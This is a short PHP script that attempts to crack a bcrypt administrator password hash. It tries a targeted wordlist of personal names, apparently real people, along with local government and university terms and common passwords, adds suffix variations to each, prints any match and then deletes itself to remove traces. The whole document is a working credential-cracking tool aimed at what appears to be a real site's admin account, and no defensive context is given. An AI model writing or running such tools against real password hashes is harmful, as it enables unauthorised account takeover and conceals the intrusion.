<?php
$adminHash = '$2y$10$4d/JVxeXpG4.5rk2QFoKzOvJ2ujom8UTJNlB/cE4klLKqAPS4Efbm';

$list = [
    'web2', 'web2laravel', 'web2ciamis', 'web2-laravel', 'web2026', 'web2024',
    'febi', 'febi123', 'febiyulianti', 'feeby', 'feebyy', 'feebyy20',
    'raissalman', 'raissalman414', 'rais', 'rais123',
    'ricky', 'ricky123', 'rickyamba', 'rickyamba123',
    'mega', 'mega123', 'megachan', 'megachan4141',
    'rahma', 'rahma123', 'rahmaendar', 'rahmaendar21',
    'dispar', 'disparciamis', 'dispar123', 'dispar2024',
    'ciamis', 'ciamis123', 'ciamismanis',
    'admin', 'admin123', 'adminciamis', 'admindispar',
    'password', 'password123',
    '12345', '123456', '1234567', '12345678', '123456789',
    'dispar@ciamis', 'admin@ciamis', 'admin@dispar',
    'bsi', 'bsi123', 'ubsi', 'ubsi123', 'binasarana',
    'bina sarana informatika'
];

foreach ($list as $word) {
    $variations = [
        $word,
        strtolower($word),
        strtoupper($word),
        ucfirst($word),
        $word . '123',
        $word . '!',
        $word . '123!',
        $word . '@123',
        $word . '2024',
        $word . '2026'
    ];
    foreach ($variations as $v) {
        if (password_verify($v, $adminHash)) {
            echo "MATCH FOUND: $v\n";
            unlink(__FILE__);
            exit;
        }
    }
}

echo "Still no match\n";
unlink(__FILE__);
